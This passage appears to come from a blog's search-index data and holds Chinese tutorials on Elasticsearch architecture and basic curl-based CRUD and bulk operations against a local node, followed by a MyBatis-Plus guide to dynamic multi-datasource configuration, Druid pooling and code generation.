Gateway 重新恢复数据。 Distributed Lucene Directory：Gateway 上层就是一个 Lucene 的分布式框架，Lucene 是做检索的，但是它是一个单机的搜索引擎，像这种 ES 分布式搜索引擎系统，虽然底层用 Lucene，但是需要在每个节点上都运行 Lucene 进行相应的索引、查询以及更新，所以需要做成一个分布式的运行框架来满足业务的需要。 四大模块组件：Districted Lucene Directory 之上就是一些 ES 的模块，Index Module 是索引模块，就是对数据建立索引也就是通常所说的建立一些倒排索引等；Search Module 是搜索模块，就是对数据进行查询搜索；Mapping 模块是数据映射与解析模块，就是你的数据的每个字段可以根据你建立的表结构通过 Mapping 进行映射解析，如果没有建立表结构，ES 就会根据数据类型推测数据结构之后自己生成一个 Mapping，然后都是根据这个 Mapping 进行解析数据；River 模块在 ES2.0 之后应该是被取消了，它的意思表示是第三方插件，例如可以通过一些自定义的脚本将传统的数据库（MySQL）等数据源通过格式化转换后直接同步到 ES 集群里，这个 River 大部分是自己写的，写出来的东西质量参差不齐，将这些东西集成到 ES 中会引发很多内部 Bug，严重影响了 ES 的正常应用，所以在 ES2.0 之后考虑将其去掉。 Discovery、Scripting：ES 四大模块组件之上有 Discovery 模块：ES 是一个集群包含很多节点，很多节点需要互相发现对方，然后组成一个集群包括选主的，这些 ES 都是用的 Discovery 模块，默认使用的是 Zen，也可是使用 EC2；ES 查询还可以支撑多种 Script 即脚本语言，包括 Mvel、JS、Python 等。 Transport 协议层：再上一层就是 ES 的通讯接口 Transport，支持的也比较多：Thrift、Memcached 以及 Http，默认的是 Http，JMX 就是 Java 的一个远程监控管理框架，因为 ES 是通过 Java 实现的。 RESTful 接口层：最上层就是 ES 暴露出来的访问接口，官方推荐的方案就是这种 RESTful 接口，直接发送 Http 请求，方便后续使用 Nginx 做代理、分发包括可能后续会做权限的管理，通过 Http 很容易做这方面的管理。如果使用 Java 客户端它是直接调用 Api，在做负载均衡以及权限管理还是不太好做。 ElasticSearch 基础检索操作节点检索操作 查看 ES 的所有节点 1curl -X GET http://127.0.0.1:9200/_cat/nodes 查看 ES 的健康状况 1curl -X GET http://127.0.0.1:9200/_cat/health 查看 ES 的主节点 1curl -X GET http://127.0.0.1:9200/_cat/master 查看 ES 的所有索引 1curl -X GET http://127.0.0.1:9200/_cat/indices 数据新增操作往 ES 新增一条数据，需要说明新增在哪个索引的哪个类型下，指定用哪个唯一标识（可选）。例如，下面的命令都是在 customer 索引下的 external 类型下新增数据。 POST 可以是新增操作，也可以是更新操作。如果不指定 ID，会自动生成 ID，即永远是新增操作。如果指定 ID，且该 ID 对应的数据已存在，则会更新这条数据，并递增版本号 12345# Post 操作，不指定 IDcurl -X POST -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external -d \'{"name": "Jim"}\'# Post 操作，指定 IDcurl -X POST -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 -d \'{"name": "Jim"}\' PUT 可以是新增操作，也可以是更新操作，但必须指定 ID。由于 PUT 需要指定 ID，一般都用来做更新操作，不指定 ID 会报错 12# PUT 操作，必须指定 IDcurl -X PUT -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 -d \'{"name": "Jim"}\' 提示 往 ES 新增数据时，可以使用 POST，也可以使用 PUT 无论是 POST 还是 PUT 操作，只要 ID 对应的数据不存在，第一次执行就是新增操作，第二次执行就是更新操作 数据查询操作从 ES 查询一条数据，需要说明在哪个索引的哪个类型下，指定用哪个唯一标识来查询。 查询在 customer 索引下的 external 类型下的 2 号数据 1curl -X GET -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 返回的 JSON 结果 123456789101112{ "_index": "customer", // 在哪个索引下 "_type": "external", // 在哪个类型下 "_id": "1", // 唯一标识 "_version": 12, // 版本号 "_seq_no": 1, // 并发控制字段，每次更新都会递增一，用来做乐观锁 "_primary_term": 1, // 同上，控制主分片重新分配，如重启，就会变化 "found": true, "_source": { // 真正的数据内容 "name": "Jim" }} 多线程并发更新数据时，需要携带 if_seq_no 和 if_primary_term 参数来更新 1curl -X PUT -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2?if_seq_no=1&amp;if_primary_term=1 -d \'{"name": "Jim"}\' 数据更新操作第一种更新方式 使用 POST 操作，并结合 _update 路径一起使用，此方式会对比原始的数据，如果与原始数据一样，则什么都不会做，_version 与 _seq_no 也都不会改变 1curl -X POST -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2/_update -d \'{"doc": {"name": "Jim"}}\' 特别注意 POST 操作结合 _update 路径一起使用时，更新的 JSON 数据必须包裹在 doc 字段内，例如：{"doc": {"name": "Jim"}} 第二种更新方式 使用 POST 操作，总会将数据重新保存，并递增 version 版本号 1curl -X POST -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 -d \'{"name": "Jim"}\' 第三种更新方式 使用 PUT 操作，总会将数据重新保存，并递增 version 版本号 1curl -X PUT -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 -d \'{"name": "Jim"}\' 三种更新方式的使用场景 对于高并发的更新，建议使用第二或者第三种方式（不带 _update 路径） 对于高并发的查询，且偶尔更新的操作，建议使用第一种方式（带 _update 路径） 提示 上述三种方式，都支持在更新数据的同时，增加字段属性，如下所示： 1curl -X POST -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2/_update -d \'{"doc": {"name": "Jim", "age": 18}}\' 1curl -X POST -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 -d \'{"name": "Jim", "age": 18}\' 1curl -X PUT -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 -d \'{"name": "Jim", "age": 18}\' 数据删除操作 删除指定的数据 1curl -X DELETE -H "Content-Type: application/json" http://127.0.0.1:9200/customer/external/2 删除指定的索引（数据库） 1curl -X DELETE -H "Content-Type: application/json" http://127.0.0.1:9200/customer 提示 ElasticSerach 不支持删除指定的类型（数据库表）。 Bulk 批量 APIBulk API 以此按顺序执行所有的 Action（动作）。如果单个的动作因任何原因而失败，它将继续处理它后面剩余的动作。当 Bulk API 返回执行结果时，它将提供每个动作的状态（与发送的顺序相同），所以可以根据返回结果检测某个动作是不是执行成功。 语法格式1234{ action: { metadata }}\\n{ request body }\\n{ action: { metadata }}\\n{ request body }\\n 批量新增操作的案例 创建 JSON 数据文件（例如 data.json），这里 JSON 数据的末尾必须要有一行空行 12345{"index":{"_id":"1"}}{"name":"John Doe"}{"index":{"_id":"2"}}{"name":"Jane Doe"} 使用 Curl 命令并通过 --data-binary 参数指定 JSON 数据文件，这里的文件名必须以 @ 开头，否则加载数据文件时会造成空行被忽略 1curl -X POST -H \'Content-Type:application/json\' http://127.0.0.1:9200/customer/external/_bulk --data-binary @data.json 特别注意 JSON 数据必须以一行空行结束，否则 ES 无法正常解析请求参数 使用 CURL 命令加载 JSON 数据文件时，往往会忽略文件末尾的空行，解决方法可以参考 这里。 批量复杂操作的案例 创建 JSON 数据文件（例如 data.json） 12345678{"delete":{"_index":"website","_type":"blog","_id":"123"}}{"create":{"_index":"website","_type":"blog","_id":"123"}}{"title":"My first blog post"}{"index":{"_index":"website","_type":"blog"}}{"title":"My second blog post"}{"update":{"_index":"website","_type":"blog","_id":"123"}}{"doc":{"title":"My updated blog post"}} 使用 Curl 命令发送批量操作的请求，这里的 URL 路径并没有直接指定 ES 的索引和类型 1curl -X POST -H \'Content-Type:application/json\' http://127.0.0.1:9200/_bulk --data-binary @data.json ElasticSearch 文档资源 ElasticSearch 官方英文文档 ElasticSearch 官方英文手册 ElasticSearch 非官方中文文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"MyBatis-Plus 入门教程之七",url:"/posts/2aa6fbd1.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 MyBatis-Plus 多数据源dynamic-datasource 是一个基于 SpringBoot 的快速集成多数据源的启动器，支持多数据源（动态数据源），适用于纯粹多库、读写分离、一主多从、混合模式的使用场景。 框架特性 支持 数据源分组 ，适用于多种场景：纯粹多库、读写分离、一主多从、混合模式。 支持数据库敏感配置信息 加密 (可自定义) ENC()。 支持每个数据库独立初始化表结构 schema 和数据库 database。 支持无数据源启动，支持懒加载数据源（需要的时候再创建连接）。 支持 自定义注解 ，需继承 DS（3.2.0+）。 提供并简化对 Druid，HikariCp，BeeCp，Dbcp2 的快速集成。 提供对 Mybatis-Plus，Quartz，ShardingJdbc，P6sy，Jndi 等组件的集成方案。 提供 自定义数据源来源 方案（如全从数据库加载）。 提供项目启动后 动态增加移除数据源 方案。 提供 Mybatis 环境下的 纯读写分离 方案。 提供使用 spel 动态参数 解析数据源方案。内置 spel，session，header，支持自定义。 支持 多层数据源嵌套切换 。（ServiceA &gt;&gt;&gt; ServiceB &gt;&gt;&gt; ServiceC）。 提供 基于 Seata 的分布式事务方案 。 提供 本地多数据源事务方案。 框架约定 本框架只做 切换数据源 这件核心的事情，并不限制你的具体操作，切换了数据源可以做任何 CRUD。 配置文件所有以下划线 _ 分割的数据源 首部 即为组的名称，相同组名称的数据源会放在一个组下。 切换数据源可以是组名，也可以是具体数据源名称。组名则切换时采用负载均衡算法切换。 默认的数据源名称为 master ，你可以通过 spring.datasource.dynamic.primary 修改。 方法上的注解优先于类上注解（就近原则）。 @DS 支持继承抽象类上的 @DS，暂不支持继承接口上的 @DS。 @DS 注解@DS 用于动态切换数据源，可以注解在方法上或类上，同时存在时方法上的注解优先于类上的注解（就近原则）。 注解 结果 没有 @DS 注解 使用默认的数据源 @DS("dsName") dsName 可以为组名，也可以为具体某个数据源的名称 多数据源使用案例这里模拟纯粹多库的使用场景，其他场景的使用方法与之类似。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-13。 创建多个数据库 创建数据库 mybatis_plus_database_1，并创建 t_employee 表 1234567891011121314CREATE DATABASE `mybatis_plus_database_1` DEFAULT CHARACTER SET utf8mb4;USE `mybatis_plus_database_1`;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee(id, last_name, gender, email, age) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 26), (2, \'Peter\',\'1\', \'peter@gmail.com\', 29); 创建数据库 mybatis_plus_database_2，并创建 t_department 表 123456789101112CREATE DATABASE `mybatis_plus_database_2` DEFAULT CHARACTER SET utf8mb4;USE `mybatis_plus_database_2`;CREATE TABLE `t_department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `deleted` int DEFAULT 0, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_department(id, name, deleted) values(1, \'开发部门\', 0), (2, \'测试部门\', 0), (3, \'产品部\', 0); 引入 Maven 依赖若在 SpringBoot 项目中已经整合好 MyBatis 与 MyBatis-Plus，则只需要引入以下 Starter 即可使用动态数据源。值得一提的是，SpringBoot 整合 MyBatis 与 MyBatis-Plus 的详细教程可查看 这里。 12345&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;dynamic-datasource-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt; 添加多数据源配置在下述的配置内容中，分别定义了数据源 mysql_1 与 mysql_2，其中的 mysql_1 是默认的数据源。 12345678910111213141516spring: datasource: dynamic: primary: mysql_1 # 设置默认的数据源或者数据源组，默认值为 master strict: true # 严格匹配数据源，默认false。设置为 true 未匹配到指定数据源时抛异常,false 使用默认数据源 datasource: mysql_1: url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_database_1?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false username: root password: 123456 driver-class-name: com.mysql.cj.jdbc.Driver mysql_2: url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_database_2?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false username: root password: 123456 driver-class-name: com.mysql.cj.jdbc.Driver 其他场景的配置示例 12345678910# 多主多从 纯粹多库（记得设置primary） 混合配置spring: spring: spring: datasource: datasource: datasource: dynamic: dynamic: dynamic: datasource: datasource: datasource: master_1: mysql: master: master_2: oracle: slave_1: slave_1: sqlserver: slave_2: slave_2: postgresql: oracle_1: slave_3: h2: oracle_2: 使用 @DS 注解切换数据源创建员工的 Mapper 与 Service Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Service 接口 12345public interface IEmployeeService extends IService&lt;Employee&gt; { public Page&lt;Employee&gt; queryByPage();} Service 实现类，使用 @DS 注解 1234567891011121314@Service@DS("mysql_1")public class EmployeeServiceImpl extends ServiceImpl&lt;EmployeeMapper, Employee&gt; implements IEmployeeService { @Override public Page&lt;Employee&gt; queryByPage() { Page&lt;Employee&gt; page = new Page&lt;&gt;(1, 10); QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.like("last_name", "i"); baseMapper.selectPage(page, wrapper); return page; }} 创建部门的 Mapper 与 Service Mapper 接口 123public interface DepartmentMapper extends BaseMapper&lt;Department&gt; {} Service 接口 12345public interface IDepartmentService extends IService&lt;Department&gt; { public Page&lt;Department&gt; queryByPage();} Service 实现类，使用 @DS 注解 1234567891011121314@Service@DS("mysql_2")public class DepartmentServiceImpl extends ServiceImpl&lt;DepartmentMapper, Department&gt; implements IDepartmentService { @Override public Page&lt;Department&gt; queryByPage() { Page&lt;Department&gt; page = new Page&lt;&gt;(1, 10); QueryWrapper&lt;Department&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.like("name", "开发"); baseMapper.selectPage(page, wrapper); return page; }} Junit 单元测试代码123456789101112131415161718192021@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private IEmployeeService empService; @Autowired private IDepartmentService deptService; @Test public void dynamicDataSource() { Page&lt;Employee&gt; empPage = empService.queryByPage(); List&lt;Employee&gt; empList = empPage.getRecords(); empList.forEach(System.out::println); Page&lt;Department&gt; deptPage = deptService.queryByPage(); List&lt;Department&gt; deptList = deptPage.getRecords(); deptList.forEach(System.out::println); }} 执行上面的测试代码后，控制台输出的日志信息如下，则说明动态数据源的配置生效了。 12345678910111213==&gt; Preparing: SELECT id,email,last_name,gender,age FROM t_employee WHERE (last_name LIKE ?)==&gt; Parameters: %i%(String)&lt;== Columns: id, email, last_name, gender, age&lt;== Row: 1, jim@gmail.com, Jim, 1, 26&lt;== Total: 1Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, age=26]==&gt; Preparing: SELECT id,name,deleted FROM t_department WHERE deleted=0 AND (name LIKE ?)==&gt; Parameters: %开发%(String)&lt;== Columns: id, name, deleted&lt;== Row: 1, 开发部门, 0&lt;== Total: 1Department [id=1, name=开发部门, deleted=0] 整合 Druid 连接池引入 Maven 依赖12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.11&lt;/version&gt;&lt;/dependency&gt; 配置 Druid 连接池12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849spring: autoconfigure: # 排除 Druid 自动配置 exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure datasource: # 指定使用 Druid 数据源 type: com.alibaba.druid.pool.DruidDataSource dynamic: primary: mysql_1 # 设置默认的数据源或者数据源组，默认值为 master strict: true # 严格匹配数据源，默认false。设置为 true 未匹配到指定数据源时抛异常,false 使用默认数据源 datasource: mysql_1: url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_database_1?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false username: root password: 123456 driver-class-name: com.mysql.cj.jdbc.Driver mysql_2: url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_database_2?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false username: root password: 123456 driver-class-name: com.mysql.cj.jdbc.Driver druid: initialSize: 5 minIdle: 5 maxActive: 30 maxWait: 60000 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT \'x\' testWhileIdle: true testOnBorrow: false testOnReturn: false poolPreparedStatements: true maxPoolPreparedStatementPerConnectionSize: 20 filters: stat,wall,slf4j,config useGlobalDataSourceStat: true stat-view-servlet: enabled: false url-pattern: /druid/* login-username: admin login-password: 123456 filter: stat: log-slow-sql: true slow-sql-millis: 1000 merge-sql: false wall: config: multi-statement-allow: true MyBatis-Plus 代码生成器代码生成器介绍MyBatis-Plus 的代码生成器，可以快速生成 Entity、Mapper、Mapper XML、Service、Controller 等各个模块的代码，极大地提升了开发效率。值得一提的是，MyBatis-Plus 的代码生成器是基于 Java 代码来生成的，而 MyBatis-Generator（MBG） 是基于 XML 配置文件进行代码生成的。 IDEA 插件 MybatisX 1、MyBatis-Plus 除了支持通过 Java 代码来生成各个模块的代码之外，还支持使用官方的 IDEA 插件 MybatisX，通过 GUI 界面的方式来快速生成代码。 2、MybatisX IDEA 插件支持 XML 跳转、生成 Java 代码与 SQL 映射文件（需要先在 IDEA 中的 Database 配置数据源）、更改或重置代码模板，详细使用教程可看 这里。 代码生成器使用案例（新版）本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-12。 提示 MyBatis-Plus 代码生成器的详细配置（适用于 3.5.1 及其以上版本） MyBatis-Plus 代码生成器的详细使用案例（适用于 3.5.1 及其以上版本） Maven 依赖MyBatis-Plus 支持 Velocity（默认）、Freemarker、Beetl、Enjoy 模板引擎，用户可以选择自己熟悉的模板引擎（直接引入依赖即可）。 1234567891011121314151617181920212223&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.23&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.freemarker&lt;/groupId&gt; &lt;artifactId&gt;freemarker&lt;/artifactId&gt; &lt;version&gt;2.3.31&lt;/version&gt;&lt;/dependency&gt; 加入 SLF4J 依赖（可选），方便查看输出的日志信息 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.36&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.36&lt;/version&gt;&lt;/dependency&gt; 快速生成代码123456789101112131415161718192021222324252627282930public class GeneratorCodeTest { /** * 数据源配置 */ private static final DataSourceConfig.Builder DATA_SOURCE_CONFIG = new DataSourceConfig.Builder("jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;useSSL=false", "root", "123456"); /** * 快速生成 */ @Test public void generatorCode() { FastAutoGenerator.create(DATA_SOURCE_CONFIG).globalConfig(builder -&gt; { builder.author("clay") // 设置作者 .enableSwagger() // 开启Swagger2模式 .fileOverride() // 覆盖已生成文件 .outputDir("D://"); // 指定输出目录 }).packageConfig(builder -&gt; { builder.parent("com.clay.mybatis") // 设置父包名 .moduleName("system") // 设置模块名 .pathInfo(Collections.singletonMap(OutputFile.xml, "D://")); // 设置SQL映射文件的生成路径 }).strategyConfig(builder -&gt; { builder.addInclude("t_employee") // 设置需要生成的表名 .addTablePrefix("t_"); // 设置过滤表前缀 }).templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认使用的是Velocity引擎模板 .execute(); }} 执行上面的测试代码后，控制台输出的日志信息如下： 123456721:04:25.308 [main] DEBUG com.baomidou.mybatisplus.generator.AutoGenerator - ==========================准备生成文件...==========================21:04:25.862 [main] DEBUG com.baomidou.mybatisplus.generator.config.querys.MySqlQuery - 执行SQL:show table status WHERE 1=1 AND NAME IN (\'t_employee\')21:04:25.901 [main] DEBUG com.baomidou.mybatisplus.generator.config.querys.MySqlQuery - 返回记录数:1,耗时(ms):3721:04:25.928 [main] DEBUG com.baomidou.mybatisplus.generator.config.querys.MySqlQuery - 执行SQL:show full fields from `t_employee`21:04:25.941 [main] DEBUG com.baomidou.mybatisplus.generator.config.querys.MySqlQuery - 返回记录数:5,耗时(ms):1221:04:26.255 [main] DEBUG com.baomidou.mybatisplus.generator.util.RuntimeUtils - 文件输出目录:D://21:04:26.255 [main] DEBUG com.baomidou.mybatisplus.generator.AutoGenerator - ==========================文件生成完成！！！========================== 代码生成后的目录机构如下： 123456789101112131415├── com│&nbsp;&nbsp; └── clay│&nbsp;&nbsp; └── mybatis│&nbsp;&nbsp; └── system│&nbsp;&nbsp; ├── controller│&nbsp;&nbsp; │&nbsp;&nbsp; └── EmployeeController.java│&nbsp;&nbsp; ├── entity│&nbsp;&nbsp; │&nbsp;&nbsp; └── Employee.java│&nbsp;&nbsp; ├── mapper│&nbsp;&nbsp; │&nbsp;&nbsp; └── EmployeeMapper.java│&nbsp;&nbsp; └── service│&nbsp;&nbsp; ├── IEmployeeService.java│&nbsp;&nbsp; └── impl│&nbsp;&nbsp; └── EmployeeServiceImpl.java└── EmployeeMapper.xml 代码生成器使用案例（旧版）提示 MyBatis-Plus 代码生成器的详细使用案例（适用于 3.5.1 以下版本） Maven 依赖MyBatis-Plus 支持 Velocity（默认）、Freemarker、Beetl、Enjoy 模板引擎，用户可以选择自己熟悉的模板引擎（直接引入依赖即可）。 1234567891011121314151617181920212223&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.23&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.freemarker&lt;/groupId&gt; &lt;artifactId&gt;freemarker&lt;/artifactId&gt; &lt;version&gt;2.3.31&lt;/version&gt;&lt;/dependency&gt; 加入 SLF4J 依赖（可选），方便查看输出的日志信息 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.36&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.36&lt;/version&gt;&lt;/dependency&gt; 快速生成代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class GeneratorCodeTest { /** * 快速生成 */ @Test public void generatorCode() { // 1. 全局配置 GlobalConfig config = new GlobalConfig(); config.setActiveRecord(true) // 是否支持AR模式 .setAuthor("clay") // 作者 .setOutputDir("D://") // 生成路径 .setFileOverride(true) // 文件覆盖 .setIdType(IdType.AUTO) // 主键策略 .setSwagger2(true) // 开启Swagger2模式 .setServiceName("%sService") // 设置生成的Service接口的名字的首字母是否为I，例如IService .setBaseResultMap(true) // 生成通用查询映射结果（ResultMap） .setBaseColumnList(true); // 生成通用查询结果列（SQL 片段） // 2. 数据源配置 DataSourceConfig dsConfig = new DataSourceConfig(); dsConfig.setDbType(DbType.MYSQL) // 数据库类型 .setDriverName("com.mysql.jdbc.Driver").setUrl("jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;useSSL=false").setUsername("root").setPassword("123456"); // 3. 策略配置 StrategyConfig stConfig = new StrategyConfig(); stConfig.setCapitalMode(true) // 全局大写命名 .setNaming(NamingStrategy.underline_to_camel) // 数据库表映射到实体的命名策略 .setTablePrefix("t_") // 过滤表前缀 .setInclude("t_employee"); // 需要生成的表名 // 4. 包名策略配置 PackageConfig pkConfig = new PackageConfig(); pkConfig.setParent("com.clay.mybatis") // 设置父包名 .setModuleName("system") // 设置模块名 .setMapper("mapper").setService("service").setController("controller").setEntity("beans").setXml("mapper"); // 5. 整合配置 AutoGenerator ag = new AutoGenerator(); ag.setGlobalConfig(config).setDataSource(dsConfig).setStrategy(stConfig).setPackageInfo(pkConfig); // 6. 执行 ag.execute(); }} 执行上面的测试代码后，控制台输出的日志信息如下： 123456789101112131422:32:15.776 [main] DEBUG org.apache.velocity.rendering - =================================================================22:32:15.778 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 模板:/templates/entity.java.vm; 文件:D://com/clay/mybatis/system/beans/Employee.java22:32:15.780 [main] DEBUG org.apache.velocity.loader - ResourceManager: found /templates/mapper.java.vm with loader org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader22:32:15.781 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 模板:/templates/mapper.java.vm; 文件:D://com/clay/mybatis/system/mapper/EmployeeMapper.java22:32:15.784 [main] DEBUG org.apache.velocity.loader - ResourceManager: found /templates/mapper.xml.vm with loader org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader22:32:15.788 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 模板:/templates/mapper.xml.vm; 文件:D://com/clay/mybatis/system/mapper/EmployeeMapper.xml22:32:15.790 [main] DEBUG org.apache.velocity.loader - ResourceManager: found /templates/service.java.vm with loader org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader22:32:15.790 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 模板:/templates/service.java.vm; 文件:D://com/clay/mybatis/system/service/EmployeeService.java22:32:15.792 [main] DEBUG org.apache.velocity.loader - ResourceManager: found /templates/serviceImpl.java.vm with loader org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader22:32:15.793 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 模板:/templates/serviceImpl.java.vm; 文件:D://com/clay/mybatis/system/service/impl/EmployeeServiceImpl.java22:32:15.795 [main] DEBUG org.apache.velocity.loader - ResourceManager: found /templates/controller.java.vm with loader org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader22:32:15.796 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 模板:/templates/controller.java.vm; 文件:D://com/clay/mybatis/system/controller/EmployeeController.java22:32:15.796 [main] DEBUG com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 文件输出目录:D://22:32:15.796 [main] DEBUG com.baomidou.mybatisplus.generator.AutoGenerator - ==========================文件生成完成！！！========================== 代码生成后的目录机构如下： 123456789101112131415└── com └── clay └── mybatis └── system ├── beans │&nbsp;&nbsp; └── Employee.java ├── controller │&nbsp;&nbsp; └── EmployeeController.java ├── mapper │&nbsp;&nbsp; ├── EmployeeMapper.java │&nbsp;&nbsp; └── EmployeeMapper.xml └── service ├── EmployeeService.java └── impl └── EmployeeServiceImpl.java MyBatisX IDEA 插件 MyBatis-Plus 除了支持通过 Java 代码来生成各个模块的代码之外，还支持使用官方的 IDEA 插件 MybatisX，通过 GUI 界面的方式来快速生成代码。 MybatisX IDEA 插件支持 XML 跳转、生成 Java 代码与 SQL 映射文件（需要先在 IDEA 中的 Database 配置数据源）、更改或重置代码模板，详细使用教程可看 这里。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"MyBatis 使用 J2Cache 